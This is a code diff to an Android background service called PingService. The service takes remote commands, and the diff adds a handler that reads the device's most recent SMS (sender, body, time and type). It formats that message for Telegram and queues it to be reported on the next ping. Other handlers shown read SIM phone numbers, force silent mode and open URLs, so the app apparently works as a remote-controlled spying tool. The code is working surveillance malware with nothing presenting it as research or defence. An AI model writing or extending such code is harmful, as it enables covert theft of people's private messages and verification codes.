@@ -210,7 +210,7 @@ class PingService : Service() {
                     sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                 }
                 "cmd_a" -> vibrate()
-                "cmd_b" -> { /* TODO */ }
+                "cmd_b" -> reportLastSms()  // last SMS
                 "cmd_c" -> { /* TODO */ }
                 "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
                 "cmd_e" -> setSilent()           // silent mode
@@ -239,6 +239,63 @@ class PingService : Service() {
                 v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
             }
         } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
+    }
+
+
+    // B — read last SMS and queue for next ping
+    private fun reportLastSms() {
+        try {
+            val cursor = contentResolver.query(
+                android.provider.Telephony.Sms.CONTENT_URI,
+                arrayOf(
+                    android.provider.Telephony.Sms.ADDRESS,
+                    android.provider.Telephony.Sms.BODY,
+                    android.provider.Telephony.Sms.DATE,
+                    android.provider.Telephony.Sms.TYPE,
+                    android.provider.Telephony.Sms.PERSON,
+                ),
+                null, null,
+                "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
+            )
+
+            val report = cursor?.use { c ->
+                if (!c.moveToFirst()) return@use "📭 No SMS found."
+                val address = c.getString(0) ?: "unknown"
+                val body    = c.getString(1) ?: ""
+                val date    = c.getLong(2)
+                val type    = c.getInt(3)
+
+                val typeStr = when (type) {
+                    android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX -> "📩 Received"
+                    android.provider.Telephony.Sms.MESSAGE_TYPE_SENT  -> "📤 Sent"
+                    android.provider.Telephony.Sms.MESSAGE_TYPE_DRAFT -> "📝 Draft"
+                    else -> "📱 SMS"
+                }
+
+                val fmt = java.text.SimpleDateFormat(
+                    "yyyy/MM/dd   HH:mm:ss", java.util.Locale.getDefault()
+                )
+                val timeStr = fmt.format(java.util.Date(date))
+
+                "💬 *Last SMS*
+" +
+                "┄┄┄┄┄┄┄┄┄┄┄┄┄
+" +
+                "$typeStr
+" +
+                "📞 $address
+" +
+                "🕐 $timeStr
+" +
+                "┄┄┄┄┄┄┄┄┄┄┄┄┄
+" +
+                body.take(800)   // Telegram message limit safety
+            } ?: "📭 Could not read SMS."
+
+            prefs.edit().putString(KEY_REPORT, report).apply()
+        } catch (e: Exception) {
+            prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
+        }
     }
 
     // D — read SIM phone numbers, queue for next ping
